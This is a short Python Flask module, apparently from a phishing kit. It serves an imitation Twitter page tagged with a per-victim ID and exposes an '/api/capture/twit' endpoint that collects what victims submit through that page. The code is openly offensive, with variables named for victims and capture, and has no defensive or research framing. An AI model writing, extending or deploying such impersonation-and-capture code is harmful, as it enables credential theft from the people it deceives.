import os
from flask import request
from bot.servers.base import create_capture_route

def register_twit_routes(app):
    @app.route('/p/twit/<uid>')
    def twit_page(uid):
        victim_id = request.args.get('v', 'unknown')
        
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        html_path = os.path.join(base_dir, 'web', 'pages', 'twit.html')
        
        try:
            with open(html_path, 'r', encoding='utf-8') as f:
                html = f.read()
        except FileNotFoundError:
            return f"❌ Twitter page not found at {html_path}", 404
        
        html = html.replace('{{VICTIM_ID}}', victim_id)
        return html

    @app.route('/api/capture/twit', methods=['POST'])
    def capture_twit():
        return create_capture_route('twit')()
